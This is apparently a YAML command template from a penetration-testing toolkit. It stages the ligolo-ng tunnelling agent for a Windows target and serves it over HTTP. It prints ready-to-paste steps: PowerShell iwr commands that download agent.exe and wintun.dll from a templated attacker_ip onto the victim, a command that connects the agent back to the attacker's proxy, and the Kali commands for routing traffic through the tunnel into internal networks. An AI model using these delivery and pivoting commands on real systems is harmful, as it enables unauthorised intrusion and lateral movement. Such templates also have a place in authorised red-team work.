---
metadata:
  filename: "deliver-windows-ligolo-ng-including-setup.yaml"
  tags: ["windows", "proxy"]
  created: "2025-03-29"
  authors: ["Unknown"]

content: |
  mkdir -p packstation/outbound;\
  cp {{ tools_dir }}/ligolo-ng/agent/windows/agent.exe packstation/outbound/;\
  cp {{ tools_dir }}/ligolo-ng/agent/wintun/wintun/bin/amd64/wintun.dll packstation/outbound/;\
  cp {{ tools_dir }}/ligolo-ng/proxy/linux/proxy .;\
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                      -----Kali-----                            '; \
  printf '%s\n' "Start proxy: sudo '$(pwd)/proxy' -selfcert"; \
  printf '%s\n' "Create a new tuntap interface: interface_create --name 'ligolo' "; \
  printf '%s\n' "Show agent interfaces: ifconfig"; \
  printf '%s\n' "Setup the routes: route_add --name ligolo --route <cidr>"; \
  printf '%s\n' "Start the tunnel: tunnel_start --tun ligolo"; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                      -----PowerShell-----                      '; \
  printf '%s\n' 'Preperation 2 (Deliver agent.exe): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/agent.exe -Outfile {{ delivery_path_windows }}\agent.exe'; \
  printf '%s\n' 'Preperation 3 (Deliver wintun.dll): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/wintun.dll -Outfile {{ delivery_path_windows }}\wintun.dll'; \
  printf '%s\n' "Connect agent to proxy: {{ delivery_path_windows }}\agent.exe -ignore-cert -connect {{ attacker_ip }}:11601"; \
  printf '%s\n' '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
